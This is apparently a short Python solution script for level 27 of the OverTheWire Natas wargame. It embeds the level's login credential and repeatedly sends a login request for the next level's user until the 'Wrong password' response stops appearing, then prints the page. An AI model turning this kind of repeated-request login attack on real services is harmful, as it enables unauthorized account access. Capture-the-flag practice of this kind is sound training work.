#!/usr/bin/env python
import requests
import sys

auth=('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

while True:
    r = requests.get('http://natas27.natas.labs.overthewire.org/index.php?username=natas28&password=admin', auth=auth)
    if not "Wrong password" in r.text:
        print r.text
        break
    else:
        sys.stdout.write('.')
        sys.stdout.flush()
